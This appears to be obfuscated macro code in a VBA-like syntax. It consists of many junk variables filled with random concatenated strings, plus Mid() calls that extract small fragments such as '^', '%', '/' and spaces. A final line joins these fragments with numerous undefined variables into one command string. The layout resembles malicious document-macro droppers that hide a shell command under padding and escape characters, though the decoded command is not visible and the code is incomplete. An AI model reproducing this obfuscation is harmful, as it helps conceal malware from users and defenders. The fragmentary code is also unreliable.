wwKSInvV = ("MUhdNVQiCAi" + "dWVGNipUSKnTw" + "HcqBFOuQzFvlad" + "qUtbARvTa" + "MMaKBhN" + "SNosAvTuNZQ") + ("cIMBbqtr" + "dMIPAsBUGvXhGH" + "iwTwHFEWC" + "ZEAZiLnWj" + "AfcACSaGdsdVA" + "WcWvksZqGAaoBu")
ZHaHWz = Mid("QUJstUGuElOuwdJBZTWB eoG", 21, 2)
oTNzuCqPE = ("dXQQCQv" + "WMVbhilb" + "AqcNSvnJ" + "zQSODfNcKBHG" + "KTWtftUr" + "ApzwXGqKbc") + ("QSitHJqN" + "TjTFsjJ" + "ZQuoucPcOGIHm" + "ZfzsrodlVCHmBQ" + "uDqzzlLhSV" + "OQsCiGSUJoFAo")
jlEOiHXRVB = ("oKmPHkG" + "wqYfwddDr" + "ibERSal" + "pmfzdDpTnmfQc" + "SizVqfuLEPv" + "urwWsLiPv") + ("nANUpcqrYa" + "zIZSwjFzdi" + "CKJwXQtTm" + "jzrzIVqR" + "MqVvuiXEwc" + "RRlYwCLrFa")
IJEfVQRjad = ("MovshHazGT" + "RJnNOzj" + "CZMsSUBUhG" + "oDCdnzQplNOP" + "ZzQwiGvq" + "dluzvcXjmt") + ("ZizOjAQwIuInK" + "TTDEpbL" + "PaQinBnRFaVXj" + "ACPipwiiUzkwcI" + "bzRjjPYzwM" + "KqpiSmTYT")
aCfnXBS = Mid("vTDHAijpiffakJ   aUYzRzcvTjwEH", 15, 3)
IMNOD = ("EnLPJiTnOPjIVY" + "PPPALzrOuSNS" + "FKwLuPm" + "jiZolINIlJQz" + "nwbFOANZQ" + "vPSiEQUNGmzfkq") + ("aodFJJzT" + "SOXGjOYHThdZ" + "aJsQvKMRI" + "ltoLjUGo" + "vjQqtOhrOsLDNm" + "OUNtNnHQ")
CdtCULlVXt = ("SndVonSAoITpiX" + "iuNcQpBfzUSPC" + "aSjhpfRRZjGjF" + "UiDJwoWFicMG" + "IdBVYQLNq" + "HtsXMViWjkSK") + ("QJROSUnHU" + "OIoYNhQuVdzw" + "GRKkAFdWw" + "MkMHCstDbmKdOY" + "RoTpwjRUsKwIjm" + "rMQLcoA")
hmpdKYl = ("CmMrComN" + "idjKTwBOSzZwI" + "GhzPHMaLoS" + "nHBpoZF" + "KjJXEBOrzUJrNu" + "GKFZfASSp") + ("DfrzZiYUz" + "ozJsNtUbribsts" + "iiAawrQTHAVWsZ" + "lWPwZIBNLmfrb" + "oLmwEuvX" + "zGYdBssWcBAsEd")
dickfjW = Mid("lOZnCXPPbPGMipwqHmEL zIzVDZhR", 21, 1)
LvrMZlTiWPj = ("NBcaXJGdDlo" + "QJjBQuPTwFkJ" + "ZuzMCwIQO" + "oUFuKmh" + "WvDlifOuhYhdH" + "SKwPIQApj") + ("CDsjLAEhP" + "NNMnMSwI" + "jikzXBvvv" + "QshOkiinhjh" + "zOvDFzKCpR" + "bzkSFUfPEIDwU")
qskVJQWilR = ("vNQhbRz" + "EsLsXJzEDaF" + "hHrYssroojS" + "iDJdGSqRQhaSF" + "haisLBHqWnW" + "piZIoXaVOTATz") + ("knLAhYTOLQGw" + "RjnhVHOcHs" + "tCskONaO" + "aQTfVGzYbWJCrC" + "lbmiLjHc" + "DHfjjzzqrCuAQI")
RGEtYmOJTX = ("wcFhiQYhPjWC" + "wzktowzGRA" + "ZSCTcLwPa" + "GVFVLBTuiB" + "CAiRUPPzVahboH" + "OFEDmGcz") + ("ciXdzfLjzUWRT" + "IvhPFwY" + "RNwmOpiOoaDspp" + "mCpOzcUkuuDwH" + "rWARjNK" + "KQWEkfwObMS")
pjHlnEb = Mid("SDSMkYGtBtSliMwsuXnbvRIDRaVWnkX  YYhXAALZ", 32, 2)
NPqEp = ("PKqBliFB" + "jwnbvCKToXcOaQ" + "bZTKpIIVTbPBs" + "rMzGfwk" + "WuoraLsf" + "otBZLPuLracUzf") + ("SNzKfIu" + "EPDYWwhzcn" + "aIrffwCvnWI" + "WOnZNOiAotZwK" + "rYMKdzjU" + "sahRNcN")
cAiqWUmcJ = ("knZmKFjhpEdM" + "SMiiqQADj" + "QotuPFVzqbz" + "VJJvKSZj" + "kiFSZAiIcjh" + "NJwQLUb") + ("EmkRKrVVuF" + "dAvfKocqEqqO" + "QDIALfzwzMawt" + "HhfIOWADDRdob" + "dWdNXsAHjVKO" + "kfoUhQA")
rnKWBUYFNf = ("zvXjKiZT" + "umqjjuVXFdid" + "IKBJuwfwUXamb" + "mbhqmqv" + "tdYJfMu" + "zidFnMiA") + ("bolaPQtHtivYn" + "mwERYklTSCMYwJ" + "OawjCLCJii" + "iBldwjMir" + "jvGQCHVj" + "qTkmfIwsk")
vDFck = Mid("QNGJHYS   tpcSMCnVjznXRZnbl", 8, 3)
rnsMVEOzlw = ("IZicrrNAqW" + "DQUaiNaBnA" + "JwzRQXOzvXbOVz" + "ljAnGswnLoQEFH" + "PNUJQjca" + "pltazcCwdnc") + ("AztGKLocASJqpI" + "tLjLIFZwU" + "YojmRbRiMOOaDF" + "ozaXcDlqPI" + "wbUobBZGmXEq" + "rrLcuwTIbnTI")
DniANUdj = ("XDFAvzNJKYJ" + "vzMrCwqMTnlLqK" + "VqomVNPpiBu" + "AmIJJGjFtdpY" + "iaKkSuJlQsSWln" + "jJiqHPqZLdbF") + ("FnsBPqnn" + "FPHkwju" + "nXTzYjzzRhrAw" + "roCfdAQG" + "zwbEOjXTGfVpDl" + "jEsCwIvm")
HQwlrnk = ("asvmzUdiipKYmN" + "wTAjHrj" + "sJwQpiVnAjda" + "LzakNEMCAEHl" + "LInkBGuHD" + "ADnzIBKrImU") + ("TawtnTirEofY" + "NAQiWjZHW" + "hZEEAqMwwz" + "oNlHTaYLYLY" + "jvBuNmGud" + "ARUiPiBsqhbtZn")
XTLPQMLR = Mid("W^SaIiZjQWhb ibGfPXilJYhzYCnsPPAFRaji", 2, 2)
FhZFwiwZwSn = ("wYSiQFu" + "jcTzzikPtO" + "VdRnDswZHOIm" + "LVGpRpC" + "lwIbSKj" + "ImEuKQcjkO") + ("SjmKYpPncXuwD" + "jkjIMkhP" + "zbDstus" + "FCzkUwmkmC" + "GBNoAiajwY" + "iHCjniUwWt")
fDSSRUCOj = ("jIjZkDnzZ" + "oXziHTjifT" + "IoQhllKmaU" + "PBjliUcE" + "obozYMRoILhZBw" + "TSszRcMwBf") + ("wzVoPGbT" + "jzSIYTWiPni" + "CIRLbdmWb" + "nRROUSTvbzh" + "sUAjazGiiN" + "svpEdncozDDLBr")
FtOSjqG = ("wpvEbPltXaiL" + "wlnDJSOv" + "jYshoKE" + "pjdWDXswH" + "uDAwvwth" + "vRnDfow") + ("XMtabpHk" + "iluNuGC" + "TsAhcwoG" + "IzBcziGO" + "kNkTNtNtNI" + "oAKlvMwvbuPFU")
DKhzwm = Mid("QDmwNfPeFpiiMnLKtbXnQidqIowk", 8, 1)
KPTUFwOh = ("zDLTMkhi" + "zLsDoPtua" + "YSfOqIwJjQ" + "IwsQwDXOBLLMZ" + "RvZAhJJl" + "SrTpULNbzSbo") + ("zmqMVfYIM" + "GHZMZIC" + "fWSZZiNC" + "okOuwSD" + "mJUodMXFlNhvwo" + "vLvRuZNLw")
GcilB = ("KGcVsGX" + "BItYuNPcfVqi" + "AIWikKtiWhE" + "iHihJLor" + "BOwudQNiChV" + "aKwFrIviDf") + ("oQQGluVJCqz" + "uajHufDTzjnDzf" + "SDsNcWmHdNK" + "kjYSdaLEfHB" + "wALbEdM" + "GTDGJdXc")
icUmfwnCwI = ("ckYwLIpVR" + "zhSBKuToQjHE" + "RTjCAIV" + "wVVBczHZFs" + "hBTNstHAFZu" + "LXkHfcFpM") + ("MALzAhvMOLnjXw" + "FqIsIQADDJdsrc" + "zDOmoSBvtaFtKj" + "fAlJZlzzDfM" + "IoWoDkQLkSkJiE" + "ORDWpTYddGhCLC")
bCBKPbwEo = Mid("iKiOMBHuijOJ^p^kmw", 13, 3)
RtqpW = ("SFtkETnb" + "JclbvKCrP" + "KLCABBVQcRJ" + "DjzMBHQ" + "jYzoTjXiXtEROv" + "vQFsjiCKK") + ("JZBiiIub" + "vlLOhRiqtj" + "smISBwwOh" + "iOpjKKVA" + "kJqtAfjBXbFsI" + "zPXRjcmMjuK")
jMXjwhsL = ("UHtWKqQLDCtoaq" + "IJbiDCPjvGMj" + "NIzOoiOwzTjmBX" + "UcTnPwH" + "ETkuFXz" + "zJSwvCfAr") + ("lJpurCfOPTm" + "QBFDvuDnJY" + "CiciZFR" + "SvoKzOJbiPrHdd" + "sRsrGkwESM" + "nMOTFJzV")
iSAWtI = ("XWhXHIpEz" + "BsHmRuZ" + "bSVosRmslYCYd" + "jjIMUATwCEatNi" + "zKrmtSru" + "iPkOXRCbaGJX") + ("EaYTfPRNwEI" + "oNKljdroZiEQ" + "ZlBzSGU" + "TGROZmbdVfLb" + "jDsqqcRiEWV" + "NGiQNjzn")
lwcrArZfKns = Mid("ZmohweSozSGzTjHjnSSdUhimiiwqzwWcYr", 4, 3)
lYDwjHt = ("ccqHpmSVYS" + "XYJjQjNLM" + "rVwqbzNOJh" + "IKzQbkCU" + "bfAvjOCiD" + "wmIzkGsROp") + ("HPkGPOM" + "pwLqvuMVC" + "MuiLklXz" + "MKiTnfMU" + "PoTzqLNck" + "NCYkpKBuWvfwjQ")
BSQLODi = ("IzEwwaPNSu" + "fzsibvup" + "jwLTIaKzZKo" + "kEDzlAn" + "RpKHPjPT" + "cBhVDkLoloWPRn") + ("FHutpkqv" + "cLulDDcL" + "zzJGijTrJzMRw" + "BDBIlWiNlGatsq" + "khMKYRqwzc" + "ZzariqjMt")
OaoBSnMTR = ("zJGdXLi" + "zFNnNDXzHAb" + "JoZsImkpYjQF" + "wrBHzNk" + "caicXnqzwYw" + "fsLkNUla") + ("CNpIkQMVqHnqG" + "NuQkwtqZLSwX" + "jRticJl" + "NpTnXidHQL" + "ZLzpzknjC" + "CWLNMjEzcKj")
QafzpV = Mid("Zt iwIzADzrWiozQmOZjlnXnErUwpjNJjqU", 3, 3)
QNGKrMtSl = ("CvqpMmMDjlod" + "ZRAGXhKEC" + "YwjmtXkMfzq" + "mVVMfivSrYvf" + "ZijIiii" + "QSsfzSfwYJfbrf") + ("kLCfJjnzABl" + "pAEBPMiVDc" + "fMPWTPQDJuD" + "wbCUPcSriNwpvU" + "QOIJaIfW" + "tMUjkzbZlB")
jKrzZB = ("JLCGkizM" + "tUoZzYislNF" + "YHVkQfaj" + "PYwozovoWN" + "szEuawOPEG" + "QUAlEhVTDWdEd") + ("slzknEOziSYDaJ" + "QLfPZHcnOj" + "SDKAPvawi" + "QfRCbRli" + "AGMzmLwo" + "oPwjAZl")
LuMbNYf = ("aMrTsklB" + "NZbwIAoBk" + "qREjbCIiHhm" + "EuMhDXpRpW" + "FFTlVbjIapI" + "qVdQQkCi") + ("foVjlbwRMT" + "UnzdHQmHXYLjv" + "WLaGYjnsJZRw" + "jAnqOWV" + "CWAJAwuGvUFZz" + "PWLnmzbiZ")
oEZrTok = Mid("PiwsfQMzJhc% lklljpmrlLYSLiOjzwDOmsn", 11, 3)
IGCifAw = ("ohCddcaI" + "fNNwqqE" + "jGGDYpR" + "VJTMjfrQ" + "cDfiXilql" + "kbGwYthRSfI") + ("slXHTHwTA" + "ziNmZTLcVM" + "JjfPKuSzOYkH" + "LuLQLduS" + "OdXlmUOFqKv" + "iErrINdUmzM")
rwLcWHKw = ("EQGiuAAUiNH" + "SbOdskBrSTLvU" + "ObJUTofR" + "zCpEDNFE" + "DWcnqIOhUbJkFL" + "jlYKNtTJA") + ("QaCjwiMON" + "wiblBGlTDIbsr" + "VRovqDkNcXZ" + "LBWzwVrUOAKn" + "HIzFrpYj" + "KjqRXKGlGDL")
vlvXdmfZHRw = ("BbfHvQrRUfS" + "rZIwkIi" + "LhcpTYDQRzs" + "RwjKpGKaS" + "JDmqAiFikdP" + "PTzpoWNbAWmB") + ("vqzJdwIHiYYD" + "YULmNOBfhPK" + "SnMrdmRkGEsHVG" + "HijvbmLwtPO" + "YzENanKL" + "vPFlHSWT")
uHSraPfu = Mid("YivGCSq  /tAUiEVOEfZPBzFHmduZbjIhzGWZ", 8, 3)
pUcnRHV = ("ujwGMFAWNU" + "AmjvkHki" + "wlqpHfw" + "NduGboNYCwfj" + "MNqZpioPVd" + "VKVIsGzhHT") + ("kaAZwVWi" + "EwclYAQS" + "JSrzXlQ" + "EfwzwcEDc" + "ZPjTsnURX" + "kkrqjfzBRkCO")
wnkQYjOFTG = ("iZjAYAlZu" + "kFREYMCPUikodu" + "qsviVawWY" + "iikcoOtWWqwP" + "UKNsBihtv" + "hiIpqYZmjtTt") + ("RmfUrSHEWada" + "HhzsqqjsCu" + "YCzzDMVubcw" + "VJpbohL" + "fOSRrorC" + "KqOszvoVKAJ")
HOIapGAIn = ("fQqlJGVY" + "vlqCVqZEfGNj" + "UnFSSiDlsMKH" + "CBBKKBJ" + "oGAiKHb" + "FwBZzwCjq") + ("qUwDYfvUoXCUv" + "ZffhFoHX" + "YnQJiCFwVUW" + "oGliUjqT" + "LkBpzSQ" + "aBjTsXPHVM")
qtjBnnOwPY = Mid("EWR &qjzjbRmOQRwPLvPQBT", 4, 2)
ziGiZPjz = ("izvLcbi" + "PuKrmBK" + "jFOUTRQmiMWN" + "GdhBCwO" + "FPNIBNPfXG" + "lEoElolQiIdPEU") + ("JQdpjEvMaqBLRE" + "GKFYcwR" + "vNRjjOczIn" + "EwChXtp" + "NOkcTMhCSJjsD" + "ricSYPzwrsXPA")
qlRIWwpnKdp = ("CGjjCCSlwGYir" + "ISKmHjn" + "SIPXJCvorlZOJ" + "NOTRTCqNrl" + "HlbtNGiCNobTft" + "pHOnIcroE") + ("SpQkzEQiZBRUvi" + "qLwfmvoYDNi" + "DcUQzWwuQSSOjK" + "FswVMjHRRvISA" + "RMXQFMBElTz" + "kOYthwbGjjEsWP")
OcddRqwmw = ("EcifmDD" + "KkzTwMKp" + "vwMHTFEUZuP" + "sEEMfzpaAF" + "njXrUER" + "oBQcRovlXiKM") + ("ooSftHTO" + "PbpzYawNkQ" + "JbVbcmYk" + "SwqsrzsE" + "bzzWTmom" + "PUoJuuEzNS")
qlwGj = Mid("ujnHcBodoiRXGhabrPlQOoIk", 9, 2)
jENqlzCKSw = ("KDUoDwQwGuzdzn" + "HiXNztt" + "NLrtulHfuq" + "qBQftCTPS" + "kSdTiZZUJPDRfG" + "MCWNwPCmjwz") + ("ziKjdbZdsNaLM" + "LlaNZVKBjAwC" + "iijzWjiZpz" + "ZpFdkzbLBPEQ" + "TXdjzzJj" + "HrvMPEcdIVm")
zbOsnR = ("YpColZPJDWVA" + "QjdmVdSz" + "awXmowTkdn" + "GIjmQljL" + "AnlUzKqEYR" + "HlDPFQzkSqSs") + ("rAICqVjuGZUm" + "DoiGPMMG" + "UERjAmw" + "hhvDdwBnNCimA" + "icuNKGMa" + "japfEkK")
HAZSOU = ("nkQhRjYlAEdRU" + "zFCbrpzwiOh" + "jXjXHjiUfn" + "zjRkwaCNi" + "lEWbjdzrpBCzu" + "BCczumzwMsDvaE") + ("YfADizS" + "waFhcqlL" + "lUjwzFSrsmsiYk" + "sqQWBwP" + "ipjWpFXIahDKGU" + "bZhLmLZ")
mRhDEckZWK = Mid("CNz VpjEkIwWGUdRuNDCLzBN", 4, 1)
GburW = ("wwNsnrIarc" + "BJiUBIVpm" + "bsjGbOcnQzDD" + "lqmTvkmnTduZ" + "CGoXivXjVEhlMc" + "mbiPwcsiOpZ") + ("AzIOmhi" + "WztPHfzQ" + "FijHGBrzibUJ" + "ZhIqXjMpuEh" + "ImhPHSfcs" + "GqwtwQOH")
EUYsfQ = ("ibkiBDELTh" + "MqzTLUVXqwBEd" + "KwMlhPABGTir" + "fOAsiQZJBnpX" + "EtiVcXHvrEr" + "mSoLjfkTmq") + ("pFXnDZJK" + "OEKHSkrLkm" + "JJTswlzRHEEqO" + "tQFjDWiuUKiH" + "tzoZizCwfmfp" + "bsCSKNwWZ")
zwdvfowazk = ("KCuaLGQ" + "NDwKdBqz" + "KjXIojjQa" + "udlwanwXN" + "LVJrJRZww" + "oFvjGfkzVVK") + ("knWfcHVX" + "dcjDoajwXHn" + "ziohCpvCA" + "sEBlWUi" + "SabwKcMjSFEww" + "WrnJizaRZ")
hpQcUrcoW = Mid("ZXizbBSzGvMzSwYDowkS   nqNCtGpGXwcirL", 21, 3)
ZjKpzPzF = ("lbjPGPpIJr" + "ERTfVqM" + "NdaulvprBAUK" + "UiCzCkvj" + "iVzNWajmpXkkL" + "LjuUQYnHohukn") + ("hTGQCWzEz" + "YPIOLzZZIn" + "QHPfLCWhQSmmS" + "WQUhorG" + "WvAQZwqHVbAZ" + "LqkrUdXjF")
KCwXFd = ("zKddqVpjatuONw" + "qiQzXDQUIWk" + "hvqRlusJzi" + "mHwSquiuj" + "UPIsXCujpU" + "GvHljbJT") + ("mdHPisakaa" + "cDCNjhYOrzd" + "OMjMphGS" + "aLkqHtOicJ" + "PqiCsuEC" + "vbXJVtC")
vanXVlRpf = ("dpJphFsTwjjk" + "fvdZqJzKms" + "KZjpUNjDRJWaP" + "JCdHDqkb" + "FwrEjXIbrw" + "iIVCzjAdTK") + ("UOShGUCi" + "DjCiscJ" + "jIhfisc" + "jaHUpHH" + "wcdmzQnY" + "tTvFqJWZ")
kYkAcqX = Mid("EtXMpmYhVVHmOMZVHluliC UfDWLfaLp", 23, 1)
irjViYDXdqz = ("flCTHJCrSWYoKj" + "oWsYidTud" + "PZwobUO" + "QwqGmHjbLaYfO" + "MMimdUUUMrZQr" + "ECqCKztkYhjl") + ("GRtVzpWMmFort" + "wmzhWPvXJj" + "VQzcnBDrcO" + "TVcaVYS" + "CKQbwzZzMVwiIJ" + "bZWkwElzQHtTiF")
IjnJh = ("DzoSAuJPqNmozQ" + "coXZhdOSJN" + "BhNfIZjjqSAJ" + "lYBPCjXVIYjKlC" + "SphiESscCKEM" + "SZCbfbo") + ("bwPcqMtJ" + "UWXwNBlVEis" + "zEwTTCiWIfJObr" + "RCOFzSYphpFEX" + "FazwNctRJ" + "KKmVoNJWWL")
kGdhjfR = ("uXFMhLFoCiOCqW" + "ftKVABwnTsRL" + "UDiuuQb" + "dwboWkUFkB" + "djcAJJEvwjmTQA" + "UzATHau") + ("CzihiQih" + "qWhQsDUlqVfo" + "cKnRQUFQuTicZ" + "abafSCC" + "uSobwfiRFPS" + "UYtMzJcT")
QOtTz = Mid("CmzEaGWD   OoTBRUjZrYlQKQmwC", 9, 3)
kfziUjb = ("TqYsdaOQdN" + "LFCFMSOOwzsrvp" + "CBUjihMwlkZ" + "jBiBfJM" + "hSjArHIOUbzdDz" + "NvziPwIQUn") + ("fNRwMhiqw" + "RTpaZwcKlvAm" + "QFiiwAZCPNc" + "vwVORuMwnwc" + "DpAfGjrO" + "jAtdDlpZiBGMw")
wRXzwtN = ("iSSfjJqCbYnlb" + "tHnldfjkPw" + "kutjQPqTqlz" + "qBUNFzMTsARP" + "PaAOMzC" + "DwOzTKIzSk") + ("vZwkJRalCfik" + "iiBopEiouOn" + "FQmoEVa" + "jTbSqrzlM" + "nVOlTkJUHOGwAK" + "jDBozwJI")
caRGoPJpi = ("BGvUAnnpUdb" + "GAtvfVNkLvc" + "NJWZFuVuFLwY" + "PrbFtjQC" + "fpfmWkzNTFi" + "GrQOkZHj") + ("vBUlQimfRP" + "ildhtTYl" + "rrtuAJzKrJHJWG" + "oLAGGMiBqSbV" + "jUQAVkdDI" + "lHiboIHCMiu")
fwNHvncQB = Mid("ZSQj e MzJrovsnHozkBKCwLuhWWvhqIMajQEvh", 5, 3)
LifSUSqX = ("wKHizwHsbv" + "RoTzBikOLJj" + "QJJnvzOBi" + "tpIdbWJH" + "UFkrskDmT" + "vwKMrqYoK") + ("vMuwFvio" + "CNEEwONjSR" + "rKvmiQi" + "RmDizvRILnm" + "FPOQAqrOwdKGWG" + "lRHNoMBXlz")
mZzbdviA = ("KkJfuWd" + "hcpHmvkRk" + "wDZRLlqYAdXZp" + "lEZmrzOFUrd" + "ZuFRshNXllctZ" + "pWVzuHnIVi") + ("waldrihnXM" + "SjlpMRuzbjMSJr" + "UzWAQYXvtGct" + "DuFCLtEmOEuVOV" + "qlIblIN" + "RWvXunrikYAw")
vrjlfhcjojN = ("FJfGCsjVwcv" + "lrYUinbzLtb" + "qDZzkDrcRUl" + "jraSaBIrqlVV" + "rXjKBTMhz" + "wSikukSNQ") + ("plmMJXKk" + "pFhEhsjHSPBY" + "jbczrQO" + "XYFOaGkW" + "iIbzJKQ" + "BsNdzwPio")
HRibwD = Mid("vdhlNslhSBGTbEpiZUBHqINL e hjSOHjbi", 25, 3)
vJMRdmCoQoS = ("aKGQnwFtbiCC" + "FHwAHlpKo" + "QWJzXVKzNZY" + "bBLwMIqps" + "UdijkjQOHXliqt" + "ziXRhodspjz") + ("JZhTwnWBjQnla" + "zSBdwKRUPZTY" + "FrktDmvG" + "ZEnrUszjvmqzo" + "rLjmXpKI" + "acQKvXj")
KzWqmWVIm = ("sVwXDvhwcT" + "utTCCaqIGZC" + "RZOvLXrwY" + "zMzcPUApE" + "zQHfrwRQz" + "kzqHjzozVYkX") + ("fvHEaKVI" + "UkOBSjDPF" + "wlfAWqwRjAT" + "jcIbjkrrFdi" + "cFsffEwGS" + "aWAvkNit")
NLfutkjdM = ("fbKswqFqZWidjh" + "QjthTzXQ" + "REMODiCIMnL" + "iRuUiwzTbi" + "sQzdCpPzH" + "fasdqmrT") + ("RtWnmOwNpD" + "wDmlUzEEzTw" + "DMzrCqoKGzBNZ" + "dNOEcavhOb" + "HJsimTGUFTanX" + "WAtTwCZLwUqqvq")
wLICsQwnbB = Mid("uOiVsUo fVsXOFswXDAZiNGwSvTmzW", 7, 3)
dzivMi = ("IwoElsqzSXOUS" + "LXQzQmbE" + "NWCmboAd" + "MoWVoBHmo" + "djEpHPo" + "UQNGNDlaij") + ("PKStAIi" + "qjOqiwWbcJju" + "mRfNAGbSjO" + "XhZuKpDhd" + "woFZjIrcJQB" + "ictnjzBCSGUvS")
hWohXQ = ("NDTmLliNSzA" + "zifioALFvMDMh" + "lRGiwmANV" + "LGVLDwRM" + "SfifzudqNjBAH" + "tARHoBO") + ("mMWShizCzuqWO" + "HlGjSvnjUIEB" + "LlrdLaitRJh" + "wqLjHKkp" + "sjAEiSBF" + "NNfDoQGRfvktp")
AVFfdE = ("YbQmFzRsocanRw" + "pazRizzBXJEf" + "MrTJHmjPLWK" + "XpnQMsi" + "RcjWdkz" + "atdBUqjwJQj") + ("OUiEnQKJJkK" + "WbJjLzjWo" + "pRsJhhIq" + "wMCpzzcj" + "ZnSpjNfth" + "lLkJqHfMLdidBS")
wfhPEIOTSvb = Mid("froMiGSXDWXNpOipEzeHHwPmfwwSzlF", 19, 1)
DAzaCEckON = ("ZXUEczMwULU" + "FqYdHcnZv" + "jvCucpfoEN" + "EahNOZH" + "PtTiVKPsBnI" + "QjGqYBh") + ("XTfHHPAQrP" + "DjtfaNNhjNzdBw" + "mYUroMsm" + "wNMaGJzA" + "tFZWAfdLUzHZ" + "iKzccvAahKtli")
Vwrrdhhlcz = ("njLrhdONVdl" + "oWVPLPOXzDCEj" + "jAuDqAXUjiDKz" + "wVvwhpGtMqdmd" + "ijjHIttOTRm" + "VTpnLBPaabIG") + ("uhpnDZEWqq" + "CvCFtiCdKzTmDZ" + "cWDGCaalOLE" + "PrhNidtkQzJ" + "rZfvZaulOYzh" + "knVbKntoHm")
hiCmpi = ("AmbZOzqHr" + "PXpOdrufjHjC" + "dhEALMujlRS" + "ZtXtczXTSNF" + "mzqQNCb" + "wLzsKwivwBi") + ("WlDzXmG" + "LiIQcwOO" + "iTjpoiOwij" + "UcWRizjAtst" + "vTSPCjQLiQZ" + "huPiGpBsD")
IHPBE = Mid("zvjF DciCEMVqpDqcPhGcGUYBAKXIim", 5, 1)
sDNGwiWzciH = ("cjpJKoOcMVOc" + "iMnRTMrtztupYJ" + "LQsjntT" + "llaZJUVzWLZzw" + "cVvurcp" + "TlfIRwdioBLWCf") + ("mhYiwYiwMHLnX" + "sBqzqSpuADYUr" + "YlbzwcJNSw" + "WonTBFJFqwzUWM" + "DshVFbjHa" + "fOquifirGTd")
lvapAla = ("tzqhmUXGtzdU" + "ZKuowGAm" + "zTQjbQiZHdFb" + "dWcdanDDT" + "uCiSIBlIVvHwWR" + "tHXUsAO") + ("GjYLVjMiifUW" + "szZXVVkjMfAL" + "hffjawfSclk" + "QcIMYSBvWAJzw" + "idDtBYAuwh" + "zEWqOQM")
ScwTzJ = ("azwPOAa" + "QFkjYRfzsS" + "hMtVrSKLQRdQt" + "BRhWqMfhCJad" + "VNzlzodw" + "hiGzEpKGnorzX") + ("waCFKzKjuOLowQ" + "icQnMjDQsIq" + "vVmlHwOBKw" + "SwizjsmPqtbJ" + "bMKPuKKw" + "cOOIcDqjPV")
pLHUSTcc = Mid("smlFRCYHlpWBZMCzwjFsjHrZhQAomas", 28, 2)
FRTLh = ("hFscToMwQEjWi" + "DTBOikMpVdaJ" + "OfEHkzIPSm" + "kFpZkqS" + "UMBCoAhb" + "rjPBJPwTLzw") + ("ZWkhAdcvnF" + "LPpMMdQGDVf" + "jWzaqqFZsV" + "upQUnWEjplDE" + "UDlquqtDtwBK" + "DmEhjnp")
RHNttiffj = ("csIMoXqj" + "UwnwEQj" + "UmrOnchGnMEWzA" + "WkishSz" + "wRCmCvENDtA" + "pbtpPbFAK") + ("MCTsRNVYzhXI" + "wlqiLiwAdwhRu" + "tcGMwTMFzTKdq" + "itTwjiwEZwuSL" + "iEmbXWbvtUao" + "rlWUhsGWkflk")
wTjIvIuz = ("uWwJcjwopmj" + "OGnFPiBcj" + "rOJnTSb" + "EQOIZjph" + "HuOEMVsmw" + "zRClMttihzpPfM") + ("hQDFjGPiMuhV" + "ftQAXUcrCiCPfC" + "hcrPBWiF" + "hPrkiqqiYwzoi" + "sLkpilBpAEHBj" + "SUZAncS")
ZLFTL = Mid("qRd sELNkRfwmGpKGcVsaaFHWbmcJqQzQRGMffE", 4, 1)
oJwnTiaFm = ("vpDJSiIa" + "vhjGUQiAwV" + "CESCbMZFPwZAr" + "amsjCwjG" + "qplaXpnkjQ" + "JqXAiFEDKYWjr") + ("tiqQwYMvkbMqmB" + "cOskzAjPr" + "wsdwwUJ" + "fdLwTjsfOGvnsT" + "nhKdvsu" + "PwPAfizo")
OVjhXX = ("imYsRjiGFrSFij" + "jvJRrkiNk" + "ZKAiftEfmNtvC" + "ZzjJRAoNaMhjbQ" + "KAYoCrZ" + "cawNavSTksJ") + ("sAUwkBMknzwRo" + "cNVGzHAVHjT" + "NRHswnRYJJjc" + "Bfpqibj" + "zTFwdtCrWt" + "cznucvALzPTT")
wIDpRh = ("DwHYEfuJ" + "TmdTEJdppOlrN" + "kTvwEiM" + "OSokvMiiBQTDZI" + "vuFXpskCPqvW" + "IhpajWY") + ("fUNQLHNV" + "JbcnAEzLWD" + "PYtApaZUatX" + "jVQasGi" + "XhsjUuRIdqPJ" + "uvGaNblhs")
joPBUMB = Mid("NPkYwNRmmzlwsEX sBZPwNvosBIOzAGSB", 16, 1)
oJuHLcol = ("sCzcLicImMQw" + "tStPhmP" + "AGOkMviPhKdzYG" + "vafsQbqlWwa" + "hRkijDk" + "vjrwjwtFCmwdn") + ("zpBuzUJVromtw" + "zcwwnOfMihISik" + "jzwOqUujmEQi" + "rDMpBvIaqB" + "YLkGUmhlZmIqp" + "GdCvKsXfFVf")
KiHEwql = ("sYtYNMdKJuTudu" + "JJiSUkuNE" + "IVBwoMP" + "ClJwZBOFfwOF" + "ZtpJCRHuL" + "KoTFqcMUiDIaII") + ("jdEOEzzz" + "icMpmuIsrnzJG" + "XdTbfBHwkhzToD" + "HAKpiWNPWio" + "PjVICcjjkkWUzh" + "sirTGEMjmpTb")
AfajlFFBuJq = ("TQncItvHpi" + "oMAXiJnjNXJv" + "FifJSsGPa" + "SQwwiOu" + "qcuNjKVsWSmS" + "JUVXdNmowXTNMh") + ("jNIUSpT" + "WsvVnZWnc" + "CJwcZABH" + "tEazXcPMJJRzH" + "BwiirwOajqFJY" + "DnITLvaO")
GHbipr = Mid("mODdYYZEhRzbjmwjzAEt", 8, 1)
LOnFSSG = ("JOwsrGrOOYv" + "HWuXiqszlVlfP" + "qCAjTiBGWWnd" + "rpVdFvdziRM" + "wbioncRd" + "PoOfFNoA") + ("YjANAHQsfjmiIk" + "bUHXSitVATcAG" + "AiowitcHlaXXvz" + "qbGDaDkFRiRi" + "zuYGJufBz" + "arLTihAunwnK")
iEShNGBWKEiB = vjUjDsM + jtlarDlB + CUJpObwWz + zfHQSLWdtzX + dickfjW + QOtTz + QafzpV + LpcDVlPHjw + EdOkt + DKhzwm + HRibwD + ZHaHWz + fwNHvncQB + jtESbUzXAji + XdtMKraHTMS + wfhPEIOTSvb + ZLFTL + QiNBTr + pjHlnEb + zRtVw + qlwGj + nUvwjZL + lwcrArZfKns + wLICsQwnbB + jAjSljUUk + KqtiTP + qtjBnnOwPY + aCfnXBS + XwbpouFjiX + YJGmczLUu + pLHUSTcc + XTLPQMLR + bCBKPbwEo + GHbipr + oEZrTok + mwGcqOfEp + NiCBwmUDEJc + IHPBE + lFAMkDPCW + AkDRDCXzGuj + GvvPub + IEkkiUD + hpQcUrcoW + kYkAcqX + uHSraPfu + drRLThvGuzE + vDFck + fsNLiq + mRhDEckZWK + joPBUMB + dJsMQ
